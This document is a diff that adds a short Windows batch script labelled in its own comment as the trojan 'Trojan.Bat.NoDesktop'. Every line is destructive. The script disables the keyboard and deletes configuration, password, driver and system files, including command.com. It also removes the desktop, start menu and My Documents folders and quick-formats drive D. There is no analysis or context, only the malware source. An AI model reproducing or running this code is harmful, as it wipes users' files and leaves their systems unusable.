@@ -1,0 +1,30 @@
+echo eXPecting more from ... Ratty ...
+rem This is Trojan.Bat.NoDesktop(delsys,delwin - version)
+@echo off
+c:\windows\rundll32.exe keyboard,disable
+c:\
+cd\
+cd windows
+del *.ini
+del *.pif
+del *.lnk
+del *.pwl
+del *.dat
+del *.log
+deltree/y web
+deltree/y startm~1
+deltree/y desktop
+deltree/y applic~1
+cd system
+del *.cpl
+del *.386
+del *.vxd
+del *.ocx
+del *.scf
+del *.sys
+cd..
+deltree/y java
+cd\
+deltree/y mydocu~1
+del command.com
+format d:/q/autotest
